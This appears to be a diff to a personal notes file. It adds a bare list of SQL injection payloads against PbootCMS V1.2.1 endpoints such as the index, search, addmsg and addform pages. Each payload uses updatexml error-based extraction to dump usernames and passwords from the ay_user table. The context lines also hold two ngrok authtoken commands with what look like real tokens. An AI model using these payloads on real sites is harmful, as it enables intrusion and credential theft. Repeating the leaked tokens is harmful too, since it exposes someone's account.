@@ -1,3 +1,16 @@
+
+
+cms/PbootCMS-V1.2.1/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+cms/PbootCMS-V1.2.1/index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+cms/PbootCMS-V1.2.1/api.php/cms/search?1%3D1)and(updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1))--=1【data】11=11
+cms/PbootCMS-V1.2.1/api.php/cms/addmsg【data】contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111&mobile = 111&content = 111
+cms/PbootCMS-V1.2.1/api.php/cms/addform?fcode=1【data】contacts[content`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1) );-- a] = 111&mobile = 111&content = 123
+PbootCMS/index.php?p=search【data】1=select 1  |1=select 0 判断 使用sqlmap
+/api.php/Cms/search?#acode=1&num=1&order=1【data】field=1)/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1)),0x7e),1)#&keyword=title&scode=1
+
+
+SELECT/**/distinct/**/concat(0x23,username,0x3a,password,0x23)/**/FROM/**/ay_user/**/limit/**/0,1)
+
 ngrok config add-authtoken 2eWvRxll3u2mUA2eK5XhrKHeIWn_4fz7StZCtXPrdJ6qnAh2U
 ngrok config add-authtoken 2eWyFLT4oZEbuVwxwkszPIaR7uM_2BNy6EvMcjn1B5RdcHBiR
 https://beneri.se/uploads/
